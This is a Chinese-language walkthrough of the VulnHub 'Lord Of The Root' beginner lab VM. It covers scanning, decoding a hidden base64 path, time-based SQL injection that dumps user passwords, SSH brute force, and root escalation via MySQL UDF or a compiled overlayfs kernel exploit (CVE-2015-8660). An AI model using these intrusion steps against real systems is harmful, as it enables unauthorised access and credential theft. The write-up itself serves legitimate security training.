# Lord Of The Root: 1.0.1

https://www.vulnhub.com/entry/lord-of-the-root-101,129/

difficulty: Beginner

Finish Date：2024-4-11

## IP

192.168.10.156

此台机器关闭了 icmp 回应，nmap -sP 探测时会失败。可以使用 arp 扫描：sudo arp-scan -I eth1 -l

## Scan

Open Port -> 22,1337

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c3de38e35f9da7420efaa494a1deddd (DSA)
|   2048 85946c87c9a8350f2cdbbbc13f2a50c1 (RSA)
|   256 f3cdaa1d05f21e8c618725b6f4344537 (ECDSA)
|_  256 34ec16dda7cf2a8645ec65ea05438921 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

访问 http://192.168.10.156:1337/ 就看到一张图片，使用目录扫描器看看有什么东西。http://192.168.10.156:1337/images/ 目录下有三张图片，图片的名字像是用户名，尝试用 hydra 爆破下 ssh 试试，结果没什么鸟用，看样子不是这个方向。

再次看扫描的结果，有一个 /index.php 文件，看看什么内容，在 html 源代码中发现了隐藏信息：THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh，base64 解码出来为：Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!，再次对 THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh base64 解码：/978345210/index.php，http://192.168.10.156:1337/978345210/index.php 是个登陆页面，估计能 SQL 注入 或 暴力破解。

先尝试 SQL 注入，使用 sqlmap 进行测试，显示结果存在 Time 延迟注入，抓取数据库名信息和表信息。发现数据库：Webapp，抓取其中的表信息：Users，直接获取表内数据，时间盲注需要等一段时间。

```
| 1 | frodo   | iwilltakethering |
| 2 | smeagol | MyPreciousR00t   |
| 3 | aragorn | AndMySword       |
| 4 | legolas | AndMyBow         |
| 5 | gimli   | AndMyAxe         |
```

尝试用得到的凭证登陆进行验证，这几个用户都能登陆表单，猜测这几个用户有没有可能有 ssh 用户，进行爆破，果然得到了其中的一个登陆用户：

```
[22][ssh] host: 192.168.10.156   login: smeagol   password: MyPreciousR00t
```

## flag

### 方式 1：

进入到系统，开始搜索提升到 root 的方法，发现 mysql 数据库是以 root 用户权限执行的，如果能找到登陆的用户名和密码，就有可能 udf 提权。查询相关参数，看是否满足前提条件：

```
cat /var/www/978345210/login.php

$db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');

version = 5.5.44-0ubuntu0.14.04.1

plugin_dir = /usr/lib/mysql/plugin/  <--默认路径

secure_file_priv    <--- 没有设置
```

UDF 函数注册后，得到了 root shell：

```
bash-4.3# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

### 方式 2：

Linux Exploit Suggester 2 检测出系统内核存在 2 个漏洞：

```
Local Kernel: 3.19.0
Searching 72 exploits...

Possible Exploits
[1] exploit_x
    CVE-2018-14665
    Source: http://www.exploit-db.com/exploits/45697
[2] overlayfs
    CVE-2015-8660
    Source: http://www.exploit-db.com/exploits/39230

```

尝试 CVE-2015-8660 进行提权，下载 39230.c 文件到目标机器，进行编译：

```
gcc 39230.c -o ofs
./ofs

bash-4.3# id
uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
```

### 方式 3：

在/SECRET/door2/file、/SECRET/door1/file、/SECRET/door3/file 存在 3 个 SUID 文件，猜测是存在缓冲区溢出漏洞，暂时没有进行测试提权。
